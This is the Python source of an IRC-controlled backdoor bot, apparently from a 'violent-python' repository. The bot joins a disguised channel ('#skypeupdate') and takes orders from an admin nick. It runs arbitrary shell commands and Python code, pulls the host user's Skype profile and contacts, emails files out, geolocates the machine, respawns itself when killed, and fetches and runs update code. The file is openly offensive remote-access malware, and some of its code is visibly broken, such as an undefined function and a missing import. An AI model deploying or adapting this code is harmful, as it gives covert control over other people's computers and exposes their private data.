# -*- coding: utf-8 -*-
# Nick Sweeting © 2013
# MIT Liscence

# library imports
import socket
import getpass
import random
import platform
import uuid
import signal
import time
import os
import sys
#import subprocess
import urllib2
import unicodedata
import json
from subprocess import Popen, PIPE, STDOUT
from time import strftime, sleep
from StringIO import StringIO

#TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
#TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
#TODO: modules:
#       download    will download the file at the given url and save it to the host machine
#       ports       does a quick port-scan of the system ports 20-1025
#       send_file   streams the file on the host computer to the given host:port
#       status      returns the size of the worker's task queue
#       openvpn     implement openvpn for firewall evasion

version = "4.0"                                                   # bot version

#### Remove/comment this block to disable logging stdout/err to a file
#so = se = open("bot_v%s.log" % version, 'w', 0)
## re-open stdout without buffering
#sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
## redirect stdout and stderr to the log file
#os.dup2(so.fileno(), sys.stdout.fileno())
#os.dup2(se.fileno(), sys.stderr.fileno())
#### Endblock

def log(prefix, content=''):                                      # function used to log things to stdout with a timestamp
    try:
        for line in content.split('\n'):
            print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
    except:
        print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))

log("[*] IRC BOT v%s" % version)

############ Variables

server = 'irc.freenode.net'
port = 6667
channel = '#skypeupdate'
source_checking_enabled = True
allowed_sources = ["thesquash"]                                   # only accept commands from these nicks
admin = 'thesquash'                                               # the nick to send privmsgs to by default

hostname = socket.gethostname()                                   # host's hostname
main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()        # main user of the computer detected by current owner of /dev/console
local_user = getpass.getuser()                                    # user the bot is running as

nick = '[%s|%s]' % (main_user, hostname)                          # bot's nickname

helpmsg = '''Version: v%s\n
Public Commands (main channel): \n
 1. !version                                                      #-- display bot version \n
 2. !quit                                                         #-- shutdown the bot \n
 3. !reload                                                       #-- reconnect to IRC \n
 4. !identify                                                     #-- provide info on host system \n
 5. !update                                                       #-- update the bot from git \n
 6. $<command>                                                    #-- run <command> in shell and capture live output \n
 7. >>><python>                                                   #-- eval/exec python live in the bot script \n
 8. email$                                                        #-- send an email with attachments listed after $ \n
 Private Commands (admin privmsg only): \n
 1. help                                                          #-- show this message \n
 2. version                                                       #-- display bot version \n
 3. quit                                                          #-- shutdown the bot \n
 4. reload                                                        #-- reconnect to IRC \n
 5. identify                                                      #-- provide verbose info on host system \n
 6. update                                                        #-- update the bot from git \n
 7. $<command>                                                    #-- run <command> in shell and capture live output \n
 8. >>><python>                                                   #-- eval/exec python live in the bot script \n
 9. email$                                                        #-- send an email with attachments listed after $ \n
 9. skype$profile                                                 #-- get skype profile of main user \n
 9. skype$contacts                                                #-- get skype contacts of main user \n''' % version

############ Flow functions

def timeout_handler(signum, frame):                                           # handler for timeout exceptions
    raise Exception("timedout %s %s" % (signum, frame))

def sigterm_handler(signum, frame):                                           # if user tries to kill python process, it will spawn another one
    log('[#] ----Host attempted to shutdown bot----')
    log('[#] ----Spawning subprocess----')
    privmsg("----Host attempted to shutdown bot----")
    quit_status = True
    cmd = "sleep 15; python bot.py &"
    log('[>]    CMD:     ',cmd)
    p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
    log('[#] ----Subprocess Spawned----')
    privmsg('----Subprocess Spawned----')
    irc.send ( 'QUIT\r\n' )
    raise SystemExit                                                
    sys.exit()

def line_split(lines_to_split, n):                                           # if output is multiline, split based on \n and max chars per line (n)
    output = []
    if (lines_to_split.find('\n') == -1):
        output.append(lines_to_split)
    else:
        while (lines_to_split.find('\n') != -1):
            output.append(lines_to_split.split("\n", 1)[0])
            lines_to_split = lines_to_split.split("\n", 1)[1]
    splitout = []
    for line in output:
        while line:
            splitout.append(line[:n])
            line = line[n:]
    return splitout

############ IRC functions

def parse(data):
    if data.find("PRIVMSG") != -1:
        from_nick = data.split("PRIVMSG ",1)[0].split("!")[0][1:] # who sent the PRIVMSG
        to_nick = data.split("PRIVMSG ",1)[1].split(" :",1)[0]  # where did they send it
        text = data.split("PRIVMSG ",1)[1].split(" :",1)[1].strip()  # what did it contain
        if source_checking_enabled and (from_nick not in allowed_sources and from_nick != admin):
            log("[>]     Not from an allowed source. (source checking enabled)")
            return (False,"","")                     # break and return nothing if message is invalid
        if to_nick == channel:
            source = "public"
            return_to = channel
        elif to_nick != channel:
            source = "private"
            return_to = from_nick
        log("[>]     Content: %s, Source: %s, Return To: %s" % (text, source, return_to))
        return (text, source, return_to)
    elif data.find("PING :",0,6) != -1:               # was it just a ping?
        from_srv = data.split("PING :")[1].strip()    # the source of the PING
        return ("PING", from_srv, from_srv)
    return (False,"","")                         # break and return nothing if message is invalid

def scan(match):                                                  # function to scan main channel messages for strings
    if data.find(channel) != -1 and not data.find(nick) != -1:    # checking to make sure its not a private message
        return data.find(match) != -1
    else:
        return False

def privscan(match):                                              # function to scan private messages to the bot for strings
    if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
        header = data.split("PRIVMSG")[0]
        return header.find(':%s!' % admin) != -1                  # checks to make sure private message is from admin

def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
    if type(msg) is unicode:
        msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
    elif type(msg) is not str or unicode:
        msg = str(msg).strip()
    if len(msg) < 1:
        pass
    elif (len(msg) > 480) or (msg.find('\n') != -1):
        log('[+] Sent Data:')
        log('[#] Starting multiline output.')
        msgs = line_split(msg, 480)                               # use line_split to split output into multiple lines based on max message length (480)
        total = len(msgs)
        for num, line in enumerate(msgs):
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(1)                                          # doubles as flood prevention and input checking
            try:
                data = irc.recv(4096)
            except:
                data = ""
                pass
            signal.alarm(0)
            if (data.find('!stop') != -1):
                log('[+] Recieved:')
                log('[>]    ', data.strip())
                retcode = "Stopped buffered multiline output."
                privmsg("[X]: %s" % retcode, to)
                break
            log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))      # [1/10] Output line 1 out of 10 total
        log('[#] Finished multiline output.')     
    else:
        log('[+] Sent Data:')
        log('[<]    PRIVMSG %s :%s\r' % (to, msg))
        irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))

def broadcast(msg):                                               # function to send a message to the main channel
    privmsg(msg, channel)

############ Keyword functions

load_modules()

def run_shell(cmd, timeout=60, verbose=False):                    # run a shell command and return the output, verbose enables live command output via yield
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
        p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
        log("[$]   Started.")
        continue_running = True
    except Exception as e:
        yield("Failed: %s" % e)
        continue_running = False
    signal.alarm(0)
    while continue_running:
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(1)
        try:
            line = p.stdout.readline()
            if verbose: yield(line)
            else: yield(line.strip())
        except:
            pass
        signal.alarm(0)
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(1)
        try:
            log('[#] Checking for input.')
            data = irc.recv(4096)
        except Exception as e:
            data = ""
            retcode = p.poll()  #returns None while subprocess is running
        signal.alarm(0)

        if (data.find('!cancel') != -1):
            log('[+] Recieved:')
            log('[>]    ', data.strip())
            retcode = "Cancelled live output reading. You have to kill the process manually."
            yield("[X]: %s" % retcode)
            continue_running = False
            break

        elif retcode is not None:
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(1)
            try:
                line = p.stdout.read()
            except:
                retcode = "Too much output, read timed out. Process is still running in background."
            signal.alarm(0)
            if verbose and len(line) > 0: 
                yield(line)
            if retcode != 0:
                yield("[X]: %s" % retcode)
            elif retcode == 0 and verbose:
                yield("[√]")
            continue_running = False
            break

def run_python(cmd):                                              # interactively interprets recieved python code
    try:
        try:
            buffer = StringIO()
            sys.stdout = buffer
            exec(cmd)
            sys.stdout = sys.__stdout__
            out = buffer.getvalue()
        except Exception as error:
            out = error
        out = str(out).strip()
        if len(out) < 1:
            try:
                out = "[eval]: "+str(eval(cmd))
            except Exception as error:
                out = "[eval]: "+str(error)
        else:
            out = "[exec]: "+out
    except Exception as python_exception:
        out = "[X]: %s" % python_exception
    return out.strip()

def run(cmd, public=False, return_to=admin):                                       # wrapper for run_shell which improves logging and responses
    def respond(content):
        if public:
            broadcast(content)
        else:
            privmsg(content,return_to)
    out = ''
    cmd = cmd.strip()
    log("[+] Ran Command:")
    log("[$]   CMD: ", [cmd])
    for line in run_shell(cmd, verbose=True):
        respond(line)
    log('[#] Done.')
    split = line_split(out, 480)
    ttl = len(split)
    for idx, line in enumerate(split):
        log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
        log("\n")

def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates the bot by downloading source from github, then running the update.sh script
    log('[*] Starting Selfupdate...')
    privmsg('[*] Starting Selfupdate...')
    log('[>]   Downloading source code from git')
    cmd = "rm -Rf code.zip code; curl https://codeload.github.com/%s/%s/zip/master > code.zip" % (git_user, git_repo)
    for line in run_shell(cmd):
        log('[>]    ',line)
        privmsg('[>]    %s' % line)
    cmd = "unzip code.zip -d code"
    for line in run_shell(cmd):
        log('[>]    ',line)
        privmsg('[>]    %s' % line)
    pid = os.getpid()
    cmd = "sh code/*/update.sh %s" % pid
    for line in run_shell(cmd):
        log('[>]    ',line)
        privmsg('[>]    %s' % line)
        if line.find("Starting") != -1:
            privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
            quit_status = True
            irc.send ( 'QUIT\r\n' )
            raise SystemExit
            sys.exit()

############ The beef of things
if __name__ == '__main__':
    if len(nick) > 15: nick = '[%s]' % (local_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
    last_ping = time.time()                                       # last ping recieved
    threshold = 8 * 60                                            # maximum time between pings before assuming disconnected (in seconds)
    quit_status = False

    while not quit_status:
        signal.signal(signal.SIGTERM, sigterm_handler)
        try:
            timeout_count = 0
            last_data = data = ''
            log("[+] Connecting...")
            log("[<]    Nick:        ", nick)
            log("[<]    Server:      ", server+':'+str(port))
            log("[<]    Room:        ", channel)
            try:
                irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                irc.settimeout(60)                                   # timeout for irc.recv
                irc.connect((server, port))
                recv = irc.recv ( 4096 )
                log("[+] Recieved:    ", recv+'\n')
                irc.send ('NICK %s\r\n' % nick )
                irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
                irc.send ('JOIN %s\r\n' % channel)
                broadcast('Bot v%s Running.' % version)
                try:
                    privmsg('Bot reloaded due to internal exception: %s' % exit_exception)
                    del exit_exception
                except NameError:
                    pass
            except Exception as error:
                log('[*] Connection Failed: ')
                log('[X]    ',error)
                timeout_count = 50
                sleep(10)

            while not quit_status and (timeout_count < 50):          # if timeout_count is above 50, reconnect
                if (last_data == data):                              # IRC servers  will occasionally send lots of blank messages instead of disconnecting
                    timeout_count += 1
                last_data = data
                try:
                    data = irc.recv(4096)
                    log('[+] Recieved:')
                    log('[>]    ', data.strip())
                except socket.timeout:
                    if (time.time() - last_ping) > threshold:        # if reciving data times out and ping threshold is exceeded, attempt a reconnect
                        log('[*] Disconnected.')
                        timedout_count = 50
                        quit_status = False
                        break
                    else:
                        data = str(time.time())
                        timedout_count = 0
                        pass

                if data.find('ickname is already in use') != -1:
                    nick += str(random.randint(1,200))
                    if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
                    timeout_count = 50
                    quit_status = False
                    break

                data = parse(data)

                content = data[0]
                source = data[1]
                return_to = data[2]

                if content != False:
                    if content == 'PING' and (len(source) > 0):
                        irc.send ('PONG ' + source + '\r')
                        last_ping = time.time()
                        log('[+] Sent Data:')
                        log('[<]    PONG ',source)
                        timeout_count = 0

                    ##Control keyword matches
                    elif content == '!quit' or content == 'quit':
                        privmsg('Quitting.')
                        irc.send('QUIT\r\n')
                        quit_status = True

                    elif content == '!reconnect' or content == 'reconnect':
                        privmsg('Reeconnecting.')
                        irc.send('QUIT\r\n')
                        quit_status = False
                        break

                    elif content == '!reload' or content == 'reload':
                        log('[#] ----Reloading Bot----')
                        privmsg('----Reloading Bot from file bot.py----')
                        cmd = "sleep 5; python bot.py &"
                        log('[>]    CMD:     ',cmd)
                        p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
                        log('[#] ----New Process Spawned----')
                        privmsg('----New Process Spawned----')
                        quit_status = True
                        irc.send('QUIT\r\n')
                        raise SystemExit                                              
                        sys.exit()

                    elif content == '!update' or  content == 'update':
                        selfupdate()

                    elif source == 'public':
                        if content == '!version':
                            broadcast("v"+version)

                        elif content == '!identify':
                            broadcast(identify())

                        elif content[:6] == 'email$':
                            attch = content[6:].split(',')
                            to = "nikisweeting+bot@gmail.com"
                            broadcast(email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))

                        elif content == '!geo':
                            location = str(geo_locate())
                            broadcast(location)

                        elif content == '!skype':
                            try:
                                broadcast(skype.findProfile(local_user))
                                db_path = skype.findProfile(local_user)
                                for line in skype.printProfile(db_path):
                                    broadcast(line)
                                    sleep(1)
                            except Exception as error:
                                broadcast(str(error))

                        elif content[:1] == '$':
                            cmd = content[1:]
                            run(cmd, public=True)

                        elif content[:3] == '>>>':
                            cmd = content[3:]
                            try:
                                broadcast(run_python(cmd))
                            except Exception as python_exception:
                                broadcast("[X]: %s" % python_exception)

                    elif source == 'private':
                        if content == 'help':
                            privmsg(helpmsg,to=return_to)

                        elif content == 'version':
                            privmsg("v"+version,to=return_to)

                        elif content == 'identify':
                            full_identify()

                        elif content == 'geo':
                            location_with_proxy = str(geo_locate(with_proxy=True))
                            location = str(geo_locate())
                            if location_with_proxy == location:
                                privmsg("Location: %s" % location,to=return_to)
                            else:
                                privmsg("Proxy Detected: %s" % location_with_proxy,to=return_to)
                                sleep(1)
                                privmsg("Actual Location: %s" % location,to=return_to)

                        elif content == 'skype$profile':
                            try:
                                privmsg(skype.findProfile(local_user), to=return_to)
                                db_path = skype.findProfile(local_user)
                                for line in skype.printProfile(db_path):
                                    privmsg(line, to=return_to)
                                    sleep(1)
                            except Exception as error:
                                privmsg(str(error), to=return_to)

                        elif content == 'skype$contacts':
                            try:
                                db_path = skype.findProfile(local_user)
                                for line in skype.printProfile(db_path):
                                    privmsg(line, to=return_to)
                                    sleep(1)
                                for line in skype.printContacts(db_path):
                                    signal.signal(signal.SIGALRM, timeout_handler)
                                    signal.alarm(1)                              # doubles as flood prevention and input checking
                                    try:
                                        data = irc.recv ( 4096 )
                                        log('[+] Recieved:')
                                        log('[>]    ', data.strip())
                                        if (data.find('!cancel') != -1):
                                            retcode = "Cancelled."
                                            privmsg("[X]: %s" % retcode, to=return_to)
                                            signal.alarm(0)
                                            break
                                    except:
                                        privmsg(line, to=return_to)
                                    signal.alarm(0)

                            except Exception as error:
                                privmsg(str(error), to=return_to)

                        elif content[:6] == 'admin$':
                            admins = content[6:].split(',')
                            for entry in admins:
                                allowed_sources.append(entry)
                            privmsg("Admin List: %s" % allowed_sources)

                        elif content[:8] == 'unadmin$':
                            admins = content[8:].split(',')
                            for entry in admins:
                                if entry in allowed_sources:
                                    allowed_sources.remove(entry)
                            privmsg("Admin List: %s" % allowed_sources)

                        elif content[:1] == '$':
                            cmd = content[1:]
                            run(cmd, public=False, return_to=return_to)

                        elif content[:3] == '>>>':
                            cmd = content[3:]
                            try:
                                privmsg(run_python(cmd), return_to)
                            except Exception as python_exception:
                                privmsg("[X]: %s" % python_exception, return_to)

        except (KeyboardInterrupt, SystemExit):
            break
        except Exception as exit_exception:
            log("[#] ----EXCEPTION---- ",exit_exception)
        except RuntimeError as exit_exception:
            log("[#] ----EXCEPTION---- ",exit_exception)
            
    log("[*] EXIT")
    raise SystemExit(0)
    sys.exit()